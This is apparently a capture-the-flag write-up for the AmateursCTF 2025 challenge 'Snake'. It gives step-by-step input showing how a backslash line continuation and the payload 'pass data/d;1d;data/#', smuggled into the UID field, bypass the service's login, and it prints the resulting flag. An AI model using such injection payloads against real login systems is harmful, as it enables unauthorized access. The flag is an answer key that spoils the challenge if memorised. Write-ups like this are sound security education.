---
title: "Snake"
slug: amateurctf-2025-snake
excerpt: "Authentication bypass via backslash injection"
coverImage: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800"
coverImageAlt: "Snake - AmateursCTF 2025 CTF writeup"
categories:
  - AmateursCTF 2025
  - Misc
  - Injection
date: 2025-01-22
---

> lets play some snake

**309 pts / 20 solves**

## Step 1: Connect

```bash
nc amt.rs 34411
```

## Step 2: Register an Account

1. When prompted, type `register` and press Enter.
2. The system will give you a UID (e.g., `9457385429662`). **Copy this number.**
3. For the Password, type `pass` and press Enter.

You are now logged in as a normal user. We need to log out first to perform the injection.

## Step 3: Log Out

1. Type `settings` and press Enter.
2. Type `logout` and press Enter.

## Step 4: Malicious Login (The Injection)

This is the critical part. We use the backslash `\` to trick the system into accepting spaces in the UID variable.

1. Type `login` and press Enter.
2. **At the `UID:` prompt, do exactly this:**
   - Type your UID followed by a space and a backslash: `[YOUR_UID] \`
   - Press Enter.
   - Type this exact payload: `pass data/d;1d;data/#`
   - Press Enter.

### Example Input

```
UID: 9457385429662 \
pass data/d;1d;data/#
```

## Result

The injection bypasses the authentication and reveals the flag!

## Flag

```
amateursCTF{y0u_ar3_th3_r3al_w1nn3r_0f_sn4k3}
```
